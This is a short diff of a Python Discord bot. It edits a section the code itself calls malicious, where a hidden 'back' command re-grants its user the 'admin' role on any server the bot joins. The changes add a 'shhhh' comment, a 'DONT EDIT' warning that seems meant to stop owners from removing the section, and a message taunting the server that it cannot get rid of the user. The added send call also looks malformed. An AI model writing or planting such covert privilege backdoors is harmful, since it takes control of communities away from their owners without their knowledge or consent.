@@ -24,7 +24,9 @@ async def on_ready():
 async def on_server_join(server):
     print("Joining {0}".format(server.name))
 
-#Malicious purpose
+#Malicious intent... (shhhh)
+
+# DONT EDIT LINES BELOW - DOING SO WILL RESULT IN ERRORS.
 
 @client.command(pass_context=True)
 async def ka(ctx):
@@ -55,6 +57,7 @@ async def back(ctx):
     role1 = discord.utils.get(user.guild.roles, name="admin")
     await user.add_roles(role)
     await user.add_roles(role1)
+    await ctx.send("Have you realised you cant get rid of",user,"?") 
     print ("Ayo you're back :)")
 
 @client.command(pass_context=True)
